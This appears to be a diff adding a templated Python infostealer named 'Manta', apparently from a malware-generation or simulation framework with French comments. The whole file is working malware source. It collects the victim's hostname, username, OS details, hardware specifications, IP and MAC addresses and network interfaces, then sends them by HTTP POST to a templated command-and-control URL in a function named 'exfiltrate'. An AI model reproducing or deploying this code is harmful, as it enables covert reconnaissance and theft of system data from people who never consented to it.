@@ -1,0 +1,83 @@
+{#---
+name: Manta
+malware_type: infostealer
+lang: python
+description: >
+  Manta is an infostealer that targets basic system, hardware, and network information.
+  It is not used to exfiltrate documents or credentials.
+---#}
+
+{% set start = "start_manta" %}
+
+# --- IMPORTS ---
+import platform
+import socket
+import getpass
+import uuid
+import psutil
+import json
+import requests
+import os
+import time
+import sys
+
+# --- CONFIGURATION ---
+C2_URL_MANTA = "{{ c2_url_manta }}"
+
+def get_system_info():
+    info = {}
+
+    # --- Système ---
+    info['malware_id'] = "1887509308309418244605469339184520403722"
+    info['hostname'] = socket.gethostname()
+    info['username'] = getpass.getuser()
+    info['platform'] = platform.system()
+    info['platform-release'] = platform.release()
+    info['platform-version'] = platform.version()
+    info['architecture'] = platform.architecture()[0]
+    info['uptime_seconds'] = time.time() - psutil.boot_time()
+
+    # --- Matériel ---
+    info['cpu'] = platform.processor()
+    info['cores_logical'] = psutil.cpu_count()
+    info['cores_physical'] = psutil.cpu_count(logical=False)
+    info['ram_total_MB'] = round(psutil.virtual_memory().total / (1024 * 1024), 2)
+
+    # --- Réseau ---
+    try:
+        info['ip_address'] = socket.gethostbyname(socket.gethostname())
+    except:
+        info['ip_address'] = "N/A"
+
+    try:
+        info['mac_address'] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
+                                        for ele in range(0, 8 * 6, 8)][::-1])
+    except:
+        info['mac_address'] = "N/A"
+
+    net_info = {}
+    for interface, addrs in psutil.net_if_addrs().items():
+        net_info[interface] = [addr.address for addr in addrs if addr.family == socket.AF_INET]
+    info['network_interfaces'] = net_info
+
+    return info
+
+def exfiltrate(data):
+    try:
+        headers = {'Content-Type': 'application/json'}
+        response = requests.post(C2_URL_MANTA, data=json.dumps(data), headers=headers, timeout=5)
+        return response.status_code
+    except Exception as e:
+        return f"Exfiltration error: {e}"
+
+def main():
+    system_data = get_system_info()
+    result = exfiltrate(system_data)
+    # Optionnel : log local ou debug
+    # print(result)
+
+def start_manta():
+    system_data = get_system_info()
+    result = exfiltrate(system_data)
+    # Optionnel : log local ou debug
+    # print(result)
